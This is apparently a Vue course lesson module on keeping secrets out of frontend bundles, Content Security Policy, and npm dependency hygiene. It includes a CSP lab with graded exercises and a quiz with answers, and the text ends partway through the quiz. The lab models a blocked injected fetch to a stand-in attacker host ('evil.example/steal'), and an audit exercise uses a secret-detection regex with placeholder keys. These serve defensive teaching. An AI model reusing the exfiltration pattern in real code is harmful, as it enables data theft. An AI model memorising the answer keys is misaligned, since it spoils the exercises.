// Lesson: Secrets, CSP & dependency security (Level 16)

const cspJs = `// Turn { 'default-src': ["'self'"], … } into a header value.
export function buildCsp(policy) {
  return Object.entries(policy)
    .map(([directive, sources]) => [directive, ...sources].join(' '))
    .join('; ')
}

// SIMPLIFIED evaluator — enough to build intuition. Real browsers also handle
// nonces, hashes, 'strict-dynamic', paths, ports, redirects and more.
const FALLS_BACK_TO_DEFAULT = ['script-src', 'style-src', 'img-src', 'connect-src', 'font-src', 'object-src']

export function isAllowed(policy, directive, resource, pageOrigin = 'https://shop.example') {
  let sources = policy[directive]
  if (!sources && FALLS_BACK_TO_DEFAULT.includes(directive)) sources = policy['default-src']
  if (!sources) return true // no rule at all: the browser allows it
  if (sources.includes("'none'")) return false
  if (resource === 'inline') return sources.includes("'unsafe-inline'")

  const url = new URL(resource, pageOrigin)
  return sources.some((source) => {
    if (source === "'self'") return url.origin === pageOrigin
    if (/^[a-z]+:$/.test(source)) return url.protocol === source // scheme source: https: data:
    if (source.includes('://*.')) {
      const [scheme, domain] = source.split('://*.')
      return url.protocol === scheme + ':' && url.hostname.endsWith('.' + domain)
    }
    if (source.includes('://')) return url.origin === new URL(source).origin
    return false
  })
}`

const cspApp = `<script setup>
import { reactive, computed } from 'vue'
import { buildCsp, isAllowed } from './csp.js'

// The policy your server would send for https://shop.example
const policy = reactive({
  'default-src': ["'self'"],
  'script-src': ["'self'"],
  'img-src': ["'self'", 'data:'],
  'connect-src': ["'self'"],
})

const resources = [
  { id: 'bundle', label: 'Your app bundle', directive: 'script-src', url: '/assets/index-3f2a9c.js' },
  { id: 'inline', label: 'Inline <script> injected by an attacker', directive: 'script-src', url: 'inline' },
  { id: 'photo', label: 'Product photo from images.example-cdn.com', directive: 'img-src', url: 'https://images.example-cdn.com/p/42.jpg' },
  { id: 'api', label: 'API call to api.shop.example', directive: 'connect-src', url: 'https://api.shop.example/v1/cart' },
  { id: 'exfil', label: 'Injected fetch() to evil.example', directive: 'connect-src', url: 'https://evil.example/steal' },
  { id: 'plugin', label: 'Legacy <object> plugin content', directive: 'object-src', url: '/legacy/widget.swf' },
]

const header = computed(() => buildCsp(policy))
const results = computed(() =>
  resources.map((r) => ({ ...r, allowed: isAllowed(policy, r.directive, r.url) })),
)
</script>

<template>
  <h2>Content Security Policy lab</h2>
  <p>Response header:</p>
  <code class="header">Content-Security-Policy: {{ header }}</code>

  <ul class="results">
    <li
      v-for="r in results"
      :key="r.id"
      :data-test="r.id"
      :class="r.allowed ? 'allowed' : 'blocked'"
    >
      {{ r.allowed ? '✅ allowed' : '⛔ blocked' }} — {{ r.label }}
      <small>({{ r.directive }})</small>
    </li>
  </ul>
</template>

<style scoped>
.header { display: block; padding: 8px; background: #f4f1e8; word-break: break-all; }
.allowed { color: #1f7a3a; }
.blocked { color: #b3261e; }
</style>`

const auditApp = `<script setup>
import { auditEnv } from './auditEnv.js'

// What's in this project's .env files
const env = {
  VITE_API_URL: 'https://api.shop.example',
  VITE_MAPS_PUBLIC_KEY: 'pk_maps_123',
  VITE_STRIPE_SECRET_KEY: 'sk_live_abc123',
  VITE_ADMIN_TOKEN: 'letmein',
  DATABASE_PASSWORD: 'hunter2',
}

const report = auditEnv(env)
</script>

<template>
  <h2>Ships to every browser</h2>
  <ul class="exposed">
    <li v-for="key in report.exposed" :key="key">{{ key }}</li>
  </ul>
  <h2>Probable leaks</h2>
  <ul class="leaks">
    <li v-for="key in report.leaks" :key="key">{{ key }}</li>
  </ul>
</template>`

const auditStarter = `// Vite exposes only VITE_-prefixed variables to client code.
// Return { exposed: string[], leaks: string[] }
export function auditEnv(env) {
  return { exposed: [], leaks: [] }
}`

const auditSolution = `const SECRET_NAME = /SECRET|PRIVATE|PASSWORD|TOKEN/i

function looksLikeSecretValue(value) {
  const v = String(value)
  return v.startsWith('sk_live_') || v.includes('-----BEGIN')
}

export function auditEnv(env, prefix = 'VITE_') {
  // Only prefixed variables are inlined into the client bundle by Vite.
  const exposed = Object.keys(env).filter((key) => key.startsWith(prefix))
  const leaks = exposed.filter((key) => SECRET_NAME.test(key) || looksLikeSecretValue(env[key]))
  return { exposed, leaks }
}`

const lintApp = `<script setup>
import { ref, computed } from 'vue'
import { lintCsp } from './lintCsp.js'

const header = ref("default-src 'self'; script-src 'self' 'unsafe-inline'")
const warnings = computed(() => lintCsp(header.value))
</script>

<template>
  <label>CSP header <input v-model="header" class="csp" size="70" /></label>
  <ul class="warnings">
    <li v-for="w in warnings" :key="w">{{ w }}</li>
  </ul>
  <p v-if="!warnings.length" class="ok">No warnings 🎉</p>
</template>`

const lintStarter = `// Return an array of warning codes for a CSP header string.
export function lintCsp(header) {
  const warnings = []
  return warnings
}`

const lintSolution = `function parse(header) {
  const policy = {}
  for (const part of header.split(';')) {
    const [name, ...sources] = part.trim().split(/\\s+/)
    if (name) policy[name.toLowerCase()] = sources
  }
  return policy
}

export function lintCsp(header) {
  const policy = parse(header)
  const warnings = []
  const scripts = policy['script-src'] ?? policy['default-src'] ?? []

  if (scripts.includes("'unsafe-inline'")) warnings.push('script-unsafe-inline')
  if (scripts.includes("'unsafe-eval'")) warnings.push('script-unsafe-eval')
  if (scripts.includes('*') || scripts.includes('https:')) warnings.push('script-wildcard')

  const objects = policy['object-src'] ?? policy['default-src'] ?? []
  if (!objects.includes("'none'")) warnings.push('object-src-not-none')
  if (!policy['base-uri']) warnings.push('missing-base-uri')
  if (!policy['frame-ancestors']) warnings.push('missing-frame-ancestors')

  return warnings
}`

export default {
  id: 'secrets-csp-dependencies',
  title: 'Secrets, CSP & dependency security',
  summary: 'Learn why nothing in a frontend bundle is secret, how a Content Security Policy limits the damage of an injection, and how to keep third-party packages from becoming your weakest link.',
  difficulty: 'advanced',
  minutes: 42,
  prerequisites: ['xss-safe-rendering', 'api-production'],
  related: ['auth-security', 'production-readiness', 'bundle-optimization', 'service-layers', 'create-vue-project'],
  tags: ['security', 'secrets', 'api keys', 'environment variables', 'VITE_', 'import.meta.env', 'csp', 'content security policy', 'npm audit', 'lockfile', 'supply chain', 'sri'],
  apis: [
    { name: 'import.meta.env.VITE_*', summary: 'Vite env variables exposed to client code — replaced with their literal values at build time, so they are public.' },
    { name: 'Content-Security-Policy', summary: 'HTTP response header telling the browser which sources of scripts, styles, images, connections and frames to allow.' },
    { name: 'npm ci', summary: 'Clean install that uses exactly the versions in package-lock.json and fails if it doesn\'t match package.json.' },
    { name: 'npm audit', summary: 'Checks installed packages against a database of known vulnerabilities.' },
  ],
  docs: [
    { label: 'Vite — Env variables and modes', url: 'https://vite.dev/guide/env-and-mode' },
    { label: 'Vue Guide — Security', url: 'https://vuejs.org/guide/best-practices/security.html' },
    { label: 'MDN — Content Security Policy (CSP)', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP' },
    { label: 'npm Docs — npm audit', url: 'https://docs.npmjs.com/cli/commands/npm-audit' },
    { label: 'npm Docs — npm ci', url: 'https://docs.npmjs.com/cli/commands/npm-ci' },
    { label: 'MDN — Subresource Integrity', url: 'https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity' },
  ],

  intro: `
Three habits keep a production Vue app from leaking or being hijacked:

1. **Keep secrets off the client.** Your built JavaScript is downloaded by every visitor. Anything inside it — including \`VITE_\` environment variables — is public.
2. **Send a Content Security Policy (CSP).** A response header that tells the browser "only run scripts from these places, only connect to these servers". If an injection slips past you, CSP can stop it from running or phoning home.
3. **Treat dependencies as code you ship.** Every npm package is code written by someone else that runs in your build or your users' browsers. Lockfiles, audits and a little scepticism keep that supply chain honest.
`,

  why: `
A frontend developer adds an AI feature over a weekend:

\`\`\`js
// .env
VITE_AI_API_KEY=sk-live-…

// AskBot.vue
fetch('https://api.ai-provider.example/v1/chat', {
  headers: { Authorization: 'Bearer ' + import.meta.env.VITE_AI_API_KEY },
})
\`\`\`

It works locally. In production, the key is sitting in \`dist/assets/index-….js\` — anyone can open devtools, search the source for "Bearer", and run up the bill on *your* account. "It's in an env file" didn't make it secret; Vite copied the value into the bundle on purpose, because client code asked for it.

The same theme runs through this lesson: **the browser is public territory**. You can't hide things there, so you keep secrets on servers, tell the browser what to refuse (CSP), and carefully choose the code you invite in (dependencies).
`,

  eli15: `
Imagine your app is a **comic book** you print and hand to everyone who walks by.

- **Secrets:** If you write your house key code on page 12 — even in tiny letters, even in code words — everyone who got a copy has it. The only safe place for the code is *not in the book*. In web apps, that means: secret keys live on your **server**, never in the JavaScript you send to browsers.
- **CSP:** Now imagine the comic comes with a rule card for the reader: "only trust pages printed by *us*; ignore any pages someone glued in." That's a Content Security Policy — instructions the browser follows, so sneaky glued-in pages (injected scripts) get ignored.
- **Dependencies:** You didn't draw every page yourself — some came from other artists. If one artist slipped in something nasty, it's in *your* book. So you keep a list of exactly which pages you used (a **lockfile**), check them against a list of known bad pages (**npm audit**), and don't accept pages from strangers without looking.
`,

  analogy: {
    title: 'The comic book you hand to everyone',
    body: `
Everything printed in the book is readable by every reader — forever. So you don't print the secret, you print *instructions* for readers (the rule card), and you keep a record of exactly which artists' pages you included, so you can recall a bad batch quickly.
`,
    mapping: [
      ['the printed comic book', 'your built bundle in `dist/` — downloaded by every visitor'],
      ['a code written on page 12', 'an API key in a `VITE_` env variable or in source code'],
      ['keeping the code at home', 'secrets stay on your server, which calls the third-party API for you'],
      ['the rule card for readers', 'the Content-Security-Policy header the browser enforces'],
      ['pages from other artists', 'npm dependencies'],
      ['the list of exact pages used', '`package-lock.json` (+ `npm ci`)'],
      ['the list of known bad pages', 'vulnerability advisories checked by `npm audit`'],
    ],
  },

  visual: {
    type: 'concept-diagram',
    title: 'Where an environment variable ends up',
    caption: 'Follow two variables from `.env` to production. One stays on the server; the other is printed into every copy of your bundle.',
    alt: 'A diagram: a .env file feeds the Vite build. VITE_ prefixed values are inlined into the JavaScript bundle, which is uploaded to a CDN and downloaded by every visitor\'s browser, where devtools can read it. A non-prefixed DATABASE_PASSWORD is used only by the server process and never reaches the browser.',
    props: {
      width: 760,
      height: 320,
      nodes: [
        { id: 'env', label: '.env', note: 'VITE_MAPS_KEY · DATABASE_PASSWORD', tone: 'kraft', x: 100, y: 160 },
        { id: 'build', label: 'vite build', note: 'replaces import.meta.env.VITE_*', tone: 'cobalt', x: 290, y: 90 },
        { id: 'bundle', label: 'dist/assets/index-….js', note: 'value inlined as a string', tone: 'paper', x: 480, y: 90 },
        { id: 'browser', label: 'Every visitor\'s browser', note: 'devtools → Sources → search', tone: 'red', x: 670, y: 90 },
        { id: 'server', label: 'Your server process', note: 'process.env.DATABASE_PASSWORD', tone: 'acid', x: 400, y: 250 },
      ],
      edges: [
        { from: 'env', to: 'build', label: 'VITE_* only' },
        { from: 'build', to: 'bundle' },
        { from: 'bundle', to: 'browser', label: 'CDN' },
        { from: 'env', to: 'server', label: 'server-side config', dashed: true },
      ],
      steps: [
        { focus: ['env'], text: 'Your `.env` holds two kinds of values: something meant for the client (`VITE_MAPS_KEY`, a public, domain-restricted key) and a real secret (`DATABASE_PASSWORD`).' },
        { focus: ['build'], edges: ['env->build'], text: 'During `vite build`, every `import.meta.env.VITE_MAPS_KEY` in client code is **replaced with the literal value**. Variables without the `VITE_` prefix are not exposed to client code (`import.meta.env.DATABASE_PASSWORD` is simply `undefined`).' },
        { focus: ['bundle'], edges: ['build->bundle'], text: 'The value is now a plain string inside a JavaScript file. Minification doesn\'t hide it; obfuscation only slows a reader down for a few seconds.' },
        { focus: ['browser'], edges: ['bundle->browser'], text: 'Every visitor downloads that file. Anyone can open devtools and read the key. **Rule: anything in the bundle is public.** Only put values there that are designed to be public.' },
        { focus: ['server'], edges: ['env->server'], text: 'Real secrets are read by **server** code (your API, a serverless function, a backend-for-frontend). The browser asks your server; your server uses the secret. The secret never travels to the client.' },
      ],
    },
  },

  animation: {
    type: 'comparison',
    title: 'Calling a paid API: leaky vs safe',
    caption: 'The fix for a leaked key is architectural: move the call behind your own server.',
    alt: 'Side by side. Left: a Vue component calls a third-party API directly with a secret key from import.meta.env. Right: the component calls the app\'s own /api/ask endpoint, and a server function adds the secret key and forwards the request.',
    props: {
      left: {
        label: 'Leaky: secret key in the browser',
        lang: 'js',
        code: `// AskBot.vue — runs in every visitor's browser
await fetch('https://api.ai-provider.example/v1/chat', {
  method: 'POST',
  headers: {
    Authorization: 'Bearer ' + import.meta.env.VITE_AI_KEY,
  },
  body: JSON.stringify({ question }),
})`,
      },
      right: {
        label: 'Safe: your server holds the key',
        lang: 'js',
        code: `// AskBot.vue — the browser talks only to YOUR API
await fetch('/api/ask', {
  method: 'POST',
  body: JSON.stringify({ question }),
})

// server/ask.js (Node — never shipped to the browser)
const key = process.env.AI_KEY        // no VITE_ prefix
// check the user's session, rate-limit, then forward
// the request to the provider with the key`,
      },
      points: [
        'The left version publishes the key: it is inlined into the bundle at build time.',
        'The right version keeps the key in server-only configuration.',
        'Your endpoint can authenticate users, rate-limit and validate input before spending money.',
        'If a key ever reached the bundle or git history, rotate it — deleting the line does not un-publish it.',
      ],
    },
  },

  syntax: [
    `
#### Environment variables in Vite

Vite loads \`.env\`, \`.env.local\`, \`.env.[mode]\` and \`.env.[mode].local\`. Only variables with the **\`VITE_\` prefix** are exposed to client code, and they are replaced with their values at build time.
`,
    {
      code: `# .env — committed, no secrets
VITE_API_URL=https://api.shop.example
VITE_MAPS_PUBLIC_KEY=pk_maps_123   # public by design, restricted to your domain

# .env.local — NOT committed (*.local is in the default .gitignore)
# Still public once used in client code! Only for local overrides.

# Server-only (read by your backend, never by Vite client code)
DATABASE_PASSWORD=…
PAYMENT_SECRET_KEY=…`,
      lang: 'bash',
      title: '.env files',
    },
    {
      code: `// client code
console.log(import.meta.env.VITE_API_URL)       // 'https://api.shop.example' (inlined)
console.log(import.meta.env.DATABASE_PASSWORD)  // undefined — not exposed
console.log(import.meta.env.MODE, import.meta.env.PROD) // built-ins`,
      lang: 'js',
      title: 'reading env in a Vite app (static example)',
      static: true,
    },
    {
      callout: 'warn',
      title: 'VITE_ means public',
      text: 'Vite\'s own docs warn that `VITE_*` variables must not contain sensitive information. A "public" key is fine only if it was designed to be public (publishable keys, maps keys restricted by domain). Anything that grants privileges belongs on a server.',
    },
    `
#### A Content Security Policy

CSP is an HTTP **response header** (set by your server, CDN or hosting platform). Each *directive* lists allowed *sources*:
`,
    {
      code: `Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https://images.example-cdn.com;
  connect-src 'self' https://api.shop.example;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'`,
      lang: 'text',
      title: 'a strict starting point for a Vite + Vue SPA (one header, shown on several lines)',
    },
    `
- \`'self'\` — same origin as the page. \`'none'\` — nothing. A host such as \`https://api.shop.example\` or a scheme such as \`data:\`.
- \`default-src\` is the fallback for fetch directives you don't list (\`script-src\`, \`img-src\`, \`connect-src\`, …).
- Without \`'unsafe-inline'\`, inline \`<script>\` blocks **and** inline event handlers (\`onerror="…"\`) are blocked — a big win against injected HTML. Use **nonces** (\`'nonce-…'\`, a random value per response) or **hashes** if you need specific inline scripts.
- \`frame-ancestors 'none'\` stops other sites from framing yours (clickjacking). It only works in the header, not in a \`<meta>\` tag.
- Roll out with \`Content-Security-Policy-Report-Only\` first: violations are reported, nothing is blocked.
`,
    {
      callout: 'version',
      title: 'Vue builds and CSP',
      text: 'With Vite, SFC templates are precompiled to render functions, so the runtime-only Vue build needs no `\'unsafe-eval\'`. The full build that compiles templates **in the browser** creates functions from strings at runtime and therefore needs `\'unsafe-eval\'` under CSP — one more reason to precompile.',
    },
    `
#### Dependencies

\`\`\`bash
npm ci                 # CI/production: install exactly what package-lock.json says
npm audit              # known vulnerabilities in your dependency tree
npm audit --omit=dev   # only what ships at runtime
npm audit fix          # apply compatible fixes (review the diff!)
\`\`\`

Commit \`package-lock.json\`. It pins the exact version (and an integrity hash) of every package, including dependencies of dependencies, so every install gets the same code.
`,
  ],

  walkthrough: {
    title: 'csp.js',
    lang: 'js',
    code: cspJs,
    intro: 'A simplified model of how a browser decides whether a resource is allowed by a CSP. Real browsers implement many more rules — this is for intuition.',
    steps: [
      { lines: [2, 6], text: '`buildCsp` turns a policy object into the header string: directives separated by `;`, sources by spaces.' },
      { lines: [10], text: 'Fetch directives that aren\'t listed fall back to `default-src`. That\'s why `default-src \'self\'` is such a good first line.' },
      { lines: [13, 16], text: 'Find the source list. No rule at all means allowed; `\'none\'` means blocked.' },
      { lines: [17], text: 'Inline scripts are only allowed with `\'unsafe-inline\'` (in real browsers, also via a matching nonce or hash). Most XSS payloads are inline — this is where CSP shines.' },
      { lines: [19, 29], text: 'Otherwise compare the resource URL with each source: `\'self\'` (same origin), a scheme (`data:`), a wildcard subdomain, or an exact origin.' },
    ],
  },

  playground: {
    title: 'CSP lab',
    objective: 'Tune a Content Security Policy for a shop: let legitimate resources through and keep injected ones blocked.',
    files: { 'App.vue': cspApp, 'csp.js': cspJs },
    expected: 'The header line and six resources. Your bundle is allowed; the attacker\'s inline script and the fetch to evil.example are blocked — but so are the real product photo and the real API. The legacy plugin is (worryingly) allowed.',
    experiments: [
      {
        id: 'api-origin',
        task: 'The real API at `https://api.shop.example` is blocked. Allow it in `connect-src` — without unblocking `evil.example`.',
        hint: 'Add `\'https://api.shop.example\'` to the `connect-src` array in `App.vue`.',
        tests: [
          {
            name: 'the API call is allowed and the exfiltration is still blocked',
            code: `expect(classes('[data-test="api"]')).toContain('allowed')
expect(classes('[data-test="exfil"]')).toContain('blocked')`,
          },
        ],
        explain: '`connect-src` governs `fetch`, XHR and WebSockets. Listing exact origins means an injected script can\'t quietly send stolen data to its own server.',
      },
      {
        id: 'images-cdn',
        task: 'Product photos come from `https://images.example-cdn.com`. Allow them in `img-src`.',
        hint: 'Append the origin to the `img-src` array.',
        tests: [
          {
            name: 'product photos are allowed',
            code: `expect(classes('[data-test="photo"]')).toContain('allowed')
expect(text('.header')).toContain('img-src')`,
          },
        ],
        explain: 'Each resource type has its own directive, so you can be generous with images while staying strict with scripts.',
      },
      {
        id: 'lock-down',
        task: 'Harden the policy: add `object-src \'none\'` (no plugins), `base-uri \'self\'` and `frame-ancestors \'none\'` (no framing by other sites).',
        hint: 'Add three keys to the reactive policy: `\'object-src\': ["\'none\'"]`, `\'base-uri\': ["\'self\'"]`, `\'frame-ancestors\': ["\'none\'"]`.',
        tests: [
          {
            name: 'the header contains the three hardening directives',
            code: `const h = text('.header')
expect(h).toContain("object-src 'none'")
expect(h).toContain("base-uri 'self'")
expect(h).toContain("frame-ancestors 'none'")`,
          },
          { name: 'plugin content is now blocked', code: `expect(classes('[data-test="plugin"]')).toContain('blocked')` },
        ],
        explain: '`object-src` doesn\'t need to wait for `default-src`: turning plugins off entirely is free. `base-uri` stops injected `<base>` tags from re-pointing relative URLs, and `frame-ancestors` defends against clickjacking.',
      },
      {
        id: 'unsafe-inline',
        task: 'Add `"\'unsafe-inline\'"` to `script-src` and watch the attacker\'s inline script turn green. Then remove it again.',
        hint: 'Edit the `script-src` array and run.',
        explain: '`\'unsafe-inline\'` switches off most of CSP\'s protection against XSS, because injected payloads are almost always inline. If you genuinely need an inline script, allow that one script with a per-response nonce or a hash instead.',
      },
    ],
  },

  internals: {
    beginner: `
Your Vue app is a set of files on a public web server. When someone visits, their browser downloads all of it — the JavaScript, the CSS, and any text that got baked into them during the build. There is no way to send code to a browser and also keep a secret inside that code.

A CSP is the opposite move: instead of hiding something, you *tell* the browser what it may load and run. The browser — not your code — enforces it.
`,
    technical: [
      `
**Build-time replacement.** Vite statically replaces \`import.meta.env.VITE_FOO\` with the string value while bundling (that's also why dynamic access like \`import.meta.env[name]\` doesn't work for env vars). The result is a literal in your output, often next to the code that uses it. Source maps make it even easier to read; Vite doesn't generate them for production unless you set \`build.sourcemap\` (\`'hidden'\` emits maps without linking them, for uploading to an error tracker).

**How CSP is enforced.** The browser reads the header from the HTML response and applies it to the whole document. Before fetching a script, image or connection, it checks the matching directive (falling back to \`default-src\` for fetch directives). Inline scripts and event-handler attributes count as *inline* and need \`'unsafe-inline'\`, a nonce or a hash. \`eval\` and \`new Function\` need \`'unsafe-eval'\`. Violations are logged in the console and, if configured, reported to an endpoint (\`report-to\` / \`report-uri\`).
`,
      {
        code: `<!-- With a nonce, the server generates a fresh random value per response -->
<!-- header: Content-Security-Policy: script-src 'self' 'nonce-r4nd0m' -->
<script nonce="r4nd0m">window.__CONFIG__ = { … }</script>   <!-- runs -->
<script>stealCookies()</script>                               <!-- blocked: no nonce -->`,
        lang: 'html',
        title: 'nonces: allowing one inline script, not all of them',
      },
      `
**Why lockfiles matter.** \`package.json\` usually holds *ranges* (\`"pinia": "^3.0.0"\` accepts any compatible 3.x). Without a lockfile, two installs a week apart can resolve different versions — including a freshly published malicious one. \`package-lock.json\` records the exact resolved version, download URL and an integrity hash for every package in the tree; \`npm ci\` installs exactly that and fails if it can't.

**Supply-chain attacks** take forms such as: *typosquatting* (a package named like a popular one), a *compromised maintainer account* publishing a malicious version, or *install scripts* that run arbitrary code on your machine or CI when a package is installed. \`npm audit\` only knows about **reported** vulnerabilities — it can't detect a brand-new malicious release.
`,
    ],
    production: `
- **Secrets:** keep them in server-side configuration (hosting platform secrets, a secrets manager). Proxy third-party calls through your backend. Restrict any public keys (by domain, scope and quota). If a secret ever reached git history or a deployed bundle, **rotate it** — removing the line doesn't un-publish it.
- **Scanning:** enable secret scanning on your repository (for example GitHub secret scanning with push protection, or tools such as gitleaks in CI), and search your built \`dist/\` for key-like strings before release.
- **CSP rollout:** start in \`Report-Only\` mode, collect violations, fix or allow legitimate sources, then enforce. Prefer nonces/hashes over \`'unsafe-inline'\`. Set the header at the edge (CDN/hosting config) so it covers every HTML response.
- **Third-party scripts** (analytics, chat widgets) are full-trust code in your page. Load as few as possible; pin CDN scripts with Subresource Integrity (\`integrity="sha384-…" crossorigin="anonymous"\`).
- **Dependencies:** commit the lockfile, use \`npm ci\` in CI, run \`npm audit\` (or your platform's dependency scanning) regularly, automate update PRs (Dependabot, Renovate), review lockfile diffs, and think twice before adding a package for something a few lines of code can do. Consider \`--ignore-scripts\` in CI where your dependencies allow it.
- **Transport:** HTTPS everywhere with HSTS; never put tokens or secrets in URLs (they end up in logs, history and \`Referer\` headers).
`,
  },

  mistakes: [
    {
      title: 'Putting a secret key in a VITE_ variable',
      wrong: { code: `# .env\nVITE_STRIPE_SECRET_KEY=sk_live_…`, lang: 'bash' },
      right: { code: `# server-only config (no VITE_ prefix, read by backend code)\nSTRIPE_SECRET_KEY=sk_live_…\n\n# client: only the publishable key\nVITE_STRIPE_PUBLISHABLE_KEY=pk_live_…`, lang: 'bash' },
      explanation: 'The `VITE_` prefix is literally the "please put this in the browser bundle" switch. Secret keys belong to server code; many providers give you a separate publishable key for the client.',
    },
    {
      title: '"It\'s fine, the key is obfuscated / split / base64-encoded"',
      wrong: { code: `const key = atob('c2tfbGl2ZV8uLi4=') // "hidden"`, lang: 'js' },
      right: { code: `// The browser calls your API; your server uses the key.\nawait fetch('/api/charge', { method: 'POST', body })`, lang: 'js' },
      explanation: 'Whatever your code can decode, anyone running your code can decode too — the browser has to see the real key to send it. Obfuscation is not access control.',
    },
    {
      title: 'Deleting a leaked secret instead of rotating it',
      wrong: { code: `git rm .env && git commit -m "remove secrets" # the key still works`, lang: 'bash' },
      right: { code: `# 1. Revoke/rotate the key at the provider NOW\n# 2. Check usage logs for abuse\n# 3. Move it to server config, add secret scanning`, lang: 'bash' },
      explanation: 'Git history, forks, CI logs, caches and already-downloaded bundles keep the old value. Treat any exposed secret as compromised.',
    },
    {
      title: 'Adding \'unsafe-inline\' to make CSP errors go away',
      wrong: { code: `script-src 'self' 'unsafe-inline' 'unsafe-eval'`, lang: 'text' },
      right: { code: `script-src 'self' 'nonce-{random-per-response}'`, lang: 'text' },
      explanation: 'That policy allows exactly the scripts an XSS payload would use. Find out which inline script needs to run and allow only it, with a nonce or a hash — or move it into a file.',
    },
    {
      title: 'Running npm install in CI without a committed lockfile',
      wrong: { code: `# CI\nnpm install   # resolves whatever matches the ranges today`, lang: 'bash' },
      right: { code: `# commit package-lock.json, then in CI:\nnpm ci        # exact versions + integrity check`, lang: 'bash' },
      explanation: 'Without a lockfile, a build can silently pick up a new (possibly compromised) version. `npm ci` makes installs reproducible and verifies integrity hashes.',
    },
  ],

  debugging: [
    {
      symptom: 'After enabling CSP, API calls fail with "Refused to connect to … because it violates the Content Security Policy directive connect-src".',
      cause: 'The API origin isn\'t listed in `connect-src` (or `default-src`, its fallback).',
      fix: 'Add the exact API origin to `connect-src`. Roll out new policies in `Report-Only` mode first to catch these before users do.',
    },
    {
      symptom: 'The app works with `npm run dev` but CSP blocks styles or scripts locally.',
      cause: 'The dev server injects inline styles and a client script for hot updates, which a strict production policy doesn\'t allow.',
      fix: 'Apply the strict CSP to production responses (hosting/CDN config) and test it against `vite build` + `vite preview`, rather than enforcing it on the dev server.',
    },
    {
      symptom: '`import.meta.env.API_SECRET` is `undefined` in a component.',
      cause: 'Variables without the `VITE_` prefix are deliberately not exposed to client code.',
      fix: 'Good — keep it that way if it\'s a secret. Move the code that needs it to your server. Only rename it with `VITE_` if the value is genuinely public.',
    },
    {
      symptom: '`npm audit` reports a critical vulnerability in a package you\'ve never heard of.',
      cause: 'It\'s a transitive dependency (a dependency of one of your dependencies).',
      fix: 'Use `npm ls <package>` to see who pulls it in. Update the parent package, apply `npm audit fix`, or use an `overrides` entry in package.json as a temporary measure. Check whether it ships to the browser or is build-time only (`npm audit --omit=dev`) to prioritise.',
    },
    {
      symptom: 'A CI build fails with an integrity checksum error during install.',
      cause: 'The downloaded package doesn\'t match the hash in the lockfile — a corrupted cache, a registry problem, or a tampered package.',
      fix: 'Don\'t just delete the lockfile to "fix" it. Clear the cache and retry; if it persists, investigate the package and source before updating the hash deliberately.',
    },
  ],

  bestPractices: [
    'Assume every byte of the frontend bundle is public; never put secrets in client code or `VITE_` variables.',
    'Proxy privileged third-party calls through your own server, which authenticates users and rate-limits.',
    'Rotate any secret that reached git or a deployed bundle — then add secret scanning to prevent a repeat.',
    'Send a strict CSP from the server: `default-src \'self\'`, explicit `connect-src`/`img-src`, `object-src \'none\'`, `base-uri`, `frame-ancestors`, no `\'unsafe-inline\'` for scripts.',
    'Roll out CSP changes in Report-Only mode first and monitor violation reports.',
    'Commit `package-lock.json`, install with `npm ci` in CI, run `npm audit` regularly and automate dependency updates.',
    'Prefer fewer, well-maintained dependencies; pin third-party CDN scripts with Subresource Integrity.',
  ],

  useCases: [
    'Integrating payment, AI or email providers: publishable key in the client, secret key on the server.',
    'Shipping a public-facing app that renders user content: a strict CSP as the XSS safety net.',
    'Preventing clickjacking of a banking or admin UI with `frame-ancestors \'none\'`.',
    'Release checklists: `npm audit --omit=dev`, a scan of `dist/` for key-like strings, CSP header verified.',
    'Responding to a leaked credential: rotate, audit usage, move to server config, add scanning.',
  ],

  whenToUse: {
    use: [
      '`VITE_` variables for genuinely public configuration: API base URLs, feature flags, publishable/domain-restricted keys.',
      'A CSP on every production app — strict for scripts, explicit for connections.',
      'Lockfiles and `npm ci` in every project with a CI pipeline.',
    ],
    avoid: [
      'Any credential that grants privileges in client code, however it\'s "hidden".',
      '`\'unsafe-inline\'` / `\'unsafe-eval\'` in `script-src` as a quick fix.',
      'Adding dependencies without checking maintenance, popularity and what they pull in.',
    ],
  },

  comparison: {
    title: 'Three defenses, three jobs',
    headers: ['', 'Keeping secrets server-side', 'Content Security Policy', 'Dependency hygiene'],
    rows: [
      ['Protects against', 'leaked keys, abused paid APIs', 'injected scripts running or exfiltrating data', 'malicious or vulnerable third-party code'],
      ['Where it lives', 'server config / secrets manager', 'HTTP response header', 'lockfile, CI, review process'],
      ['Works if your code has an XSS bug?', 'yes — there\'s nothing to steal in the bundle', 'yes — that\'s its purpose (defense in depth)', 'n/a'],
      ['Typical mistake', '`VITE_SECRET_KEY`', '`\'unsafe-inline\'` to silence errors', '`npm install` in CI, no lockfile'],
      ['Tooling', 'secret scanning, backend proxies', 'Report-Only mode, violation reports', '`npm ci`, `npm audit`, Dependabot/Renovate'],
    ],
    note: 'None of these replaces safe rendering ([XSS lesson](lesson:xss-safe-rendering)) or server-side authorization ([auth lesson](lesson:auth-security)). Next: [production readiness](lesson:production-readiness).',
  },

  quiz: [
    {
      id: 'secrets-csp-dependencies-q1',
      type: 'mcq',
      prompt: 'In a default Vite project, which of these `.env` values can end up in the client bundle?',
      options: [
        { text: '`VITE_API_URL` — if client code reads `import.meta.env.VITE_API_URL`' },
        { text: '`DATABASE_PASSWORD` — if client code reads `import.meta.env.DATABASE_PASSWORD`', why: 'Without the `VITE_` prefix the variable is not exposed to client code; the expression is `undefined`.' },
        { text: 'Every variable in `.env.local`', why: '`.local` only means "not committed to git". Prefix rules still apply — and prefixed values in it are just as public once used.' },
        { text: 'None — `.env` files are never bundled', why: 'The file itself isn\'t shipped, but Vite inlines the values of `VITE_` variables that client code uses.' },
      ],
      answer: 0,
      explanation: 'Only `VITE_`-prefixed variables are exposed (the prefix is configurable with `envPrefix`). Their values are copied into the bundle at build time — so they are public.',
    },
    {
      id: 'secrets-csp-dependencies-q2',
      type: 'output',
      prompt: '`.env` contains `PAYMENT_SECRET=sk_live_123` (no prefix). What does this client code log in a Vite app?',
      code: { lang: 'js', code: `console.log(import.meta.env.PAYMENT_SECRET)` },
      options: [
        { text: '`sk_live_123`', why: 'Only `VITE_`-prefixed variables are exposed to client code.' },
        { text: '`undefined`' },
        { text: 'A build error', why: 'Reading a missing property is not an error — it is simply `undefined`.' },
        { text: '`"***"` — Vite masks secrets', why: 'Vite doesn\'t mask anything; it either inlines the value (VITE_) or doesn\'t expose it.' },
      ],
      answer: 1,
